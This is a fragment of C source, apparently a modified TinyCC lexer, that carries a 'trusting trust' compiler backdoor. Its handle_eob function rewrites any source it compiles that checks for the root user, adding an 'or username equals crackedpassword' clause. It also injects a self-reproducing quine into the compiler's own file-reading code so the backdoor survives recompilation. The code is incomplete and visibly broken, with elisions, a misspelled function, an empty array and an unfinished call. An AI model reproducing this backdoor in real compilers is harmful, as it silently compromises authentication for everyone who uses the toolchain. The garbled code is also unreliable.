...
ST_INLN void cstr_ccat(CString *cstr, int ch)
{
    ...
    for(int x = 0; x < size; ++x){
        printf("%c", ((unsigned char *)cstr->data)[x]);
    }
    printf("\n");*/
    cstr->size = size;
}
...
static int handle_eob(void)
{
    ...
    if (bf->buf_ptr >= bf->buf_end) {
        if (bf->fd >= 0) {
            ...
            for(int x = 0; x < len; ++x){
                if(x >= 29 && !strncmp(&bf->buffer[x - 28], "if (!strcmp(username, \"root\"))", 29) && bf->buffer[x-29] != '\"'){
                    char * attackBuffer = calloc(len + 40, sizeof(char));
                    char * attackLogin = " || !strcmp(username, \"crackedpassword\")";
                    strncpy(&attackBuffer[0], &bf->buffer[0], x + 1);
                    strncpy(&attackBuffer[x+1], &attackLogin[0], 40);
                    sstrcpy(&attackBuffer[x+41], &bf->buffer[x+1]);
                    len = len + 40;
                    printf("%s", attackBuffer);
                    memcpy(bf->buffer, attackBuffer, sizeof(char) * (len));
                } else if(x >= 28 && !strncmp(&bf->buffer[x - 28], "ead(bf->fd, bf->buffer, len);", 29)){
                    static char quineArray[] = {
                        // the char array
                    };
                    int num = 420;
                    char * attackBuffer = calloc(len + num, sizeof(char));
                    strncpy(&attackBuffer[0], &bf->buffer[0], x + 1);
                    strncpy(&attackBuffer[x+1], &quineArray[0], 200);
                    int stoppoint = 201;
                    for(int z = 0; quineArray[z]; ++z){
                        int cpyamt;
                        int n = quineArray[z];
                        do {
                            n /= 10;
                        ...
                        memccpy(&attackBuffer[stoppoint], )
                    }
                    strcpy(&attackBuffer[x+201], &bf->buffer[x+1]);
                    len = len + num;
                    printf("%s", attackBuffer);
                    memcpy(bf->buffer, attackBuffer, sizeof(char) * (len));
                }
...
maybe_newline:
    ...
    parse_ident_fast:
        ...
        printf("\nNext parsed: ");
        char *attackbuf;
        attackbuf = calloc(len + 1, sizeof(char));
        memcpy(attackbuf, p1, len);
        attackbuf[len] = '\0';
        printf("%s", attackbuf);
        */
        if (c != '\\') {
